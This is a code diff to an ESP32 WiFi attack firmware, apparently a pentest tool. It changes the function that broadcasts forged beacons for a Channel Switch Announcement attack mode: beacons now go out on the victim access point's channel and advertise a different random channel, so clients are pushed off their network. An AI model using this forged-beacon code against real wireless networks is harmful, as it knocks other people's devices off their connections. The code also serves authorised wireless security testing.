@@ -8807,6 +8807,7 @@ void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t 
 
 void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid, int scan_mode) {
   int post_ssid_len = 12;
+  uint8_t target_channel = custom_ssid.channel;
 
   #ifndef HAS_DUAL_BAND
     set_channel = random(1,15); 
@@ -8814,12 +8815,13 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
     set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
   #endif
   if (scan_mode == WIFI_ATTACK_CSA) {
+    set_channel = custom_ssid.channel;
     post_ssid_len = 18;
-    while (set_channel == custom_ssid.channel) {
+    while (target_channel == custom_ssid.channel) {
       #ifndef HAS_DUAL_BAND
-        set_channel = random(1,15);
+        target_channel = random(1,15);
       #else
-        set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+        target_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
       #endif
     }
   } else if (scan_mode == WIFI_ATTACK_QUIET) {
@@ -8881,7 +8883,7 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
   static const uint8_t post_csa[] = {
     0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
     0x03, 0x01, 0x00,
-    0x25, 0x03, 0x01, 0x00, 0x03
+    0x25, 0x03, 0x01, 0x00, 0xff
   };
 
   static const uint8_t post_quiet[] = {
@@ -8896,7 +8898,7 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
   if (scan_mode == WIFI_ATTACK_CSA) {
     memcpy(temp, post_csa, sizeof(post_csa));
     temp[12] = custom_ssid.channel;
-    temp[16] = set_channel;
+    temp[16] = target_channel;
     post = temp;
     post_len = sizeof(post_csa);
   } else if (scan_mode == WIFI_ATTACK_QUIET) {
